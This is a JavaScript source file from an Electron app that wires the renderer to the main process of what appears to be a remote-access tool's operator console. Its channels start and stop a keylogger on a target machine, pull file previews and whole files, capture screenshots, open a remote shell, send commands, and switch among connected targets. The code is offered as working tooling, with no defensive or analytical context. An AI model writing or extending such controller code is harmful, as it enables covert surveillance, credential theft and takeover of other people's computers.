/**
 * Register ipc channels
 * Used for the communication between the main process and the renderer process
 * 用于主进程和渲染进程之间的通讯
 */

import { ipcMain } from 'electron'
import request from './Connect/request'
import { startServer, setCurrentTarget } from './Connect/server'
import { getTargetList } from './TargetList'
import { saveFile } from './File/index'
import { saveScreenShot } from './ScreenShot/index'

const channels = {
  startServer: () => startServer(),
  requestKeylogger: (event, method) => {
    if (method === 'start') {
      // console.log("requestKeylogger")
      // event.sender.send('updateKeylogger', "2333")
      request.startKeyLogger().then((packet) => {
        event.sender.send('updateKeylogger', packet)
      }).catch(err => {
        // event.sender.send('updateKeylogger', err.toString())
        console.log('requestKeylogger' + err)
      })
    } else if (method === 'stop') {
      request.stopKeyLogger().then((packet) => {
        event.sender.send('keyloggerStop', packet)
      }).catch(err => {
        // event.sender.send('updateKeylogger', err.toString())
        console.log('stopKeylogger' + err)
      })
    } else {
      console.log('wrong method')
    }
  },
  disconnect: (event) => {
    request.disconnect().then((packet) => {
      // 发送靶机连接状态ture/false
      event.sender.send('disconnected', packet)
    }).catch(err => {
      console.log(`disconnect failed ${err}`)
    })
  },
  requestFilePreview: (event, path) => {
    request.getFilePreview(path).then((packet) => {
      event.sender.send('filepreview', packet)
    }).catch(err => {
      console.log(`get filepreview failed ${err}`)
    })
  },
  requestFile: (event, path) => {
    request.transFile(path).then((packet) => {
      let url = saveFile(packet)
      event.sender.send('transfile', url)
    }).catch(err => {
      console.log(`get file failed ${err}`)
    })
  },
  requestScreenShot: (event) => {
    request.screenShot().then((packet) => {
      let url = saveScreenShot(packet)
      event.sender.send('ScreenShot', url)
    }).catch(err => {
      console.log(`get screenShot failed ${err}`)
    })
  },
  requestShell: (event, method) => {
    if (method === 'start') {
      request.startShell().then((status) => {
        event.sender.send('getShell', status)
      }).catch(err => {
        console.log(`get shell failed ${err}`)
      })
    } else if (method === 'stop') {
      request.stopShell().then((status) => {
        event.sender.send('stopShell', status)
      }).catch(err => {
        console.log(`stop shell failed ${err}`)
      })
    } else {
      console.log('wrong method')
    }
  },
  sendCommand: (event, commandLines) => {
    request.sendCommand(commandLines).then((packet) => {
      event.sender.send('commandSended', packet)
    }).catch(err => {
      console.log(`get shell response failed ${err}`)
    })
  },
  requestTargetList: (event) => {
    event.sender.send('updateTargetList', getTargetList())
  },
  setCurrentTarget: (event, uuid) => {
    setCurrentTarget(uuid)
    event.sender.send('currentTargetChanged', uuid)
  }
}

export function registerIpc () {
  for (let key in channels) {
    ipcMain.on(key, channels[key])
  }
}
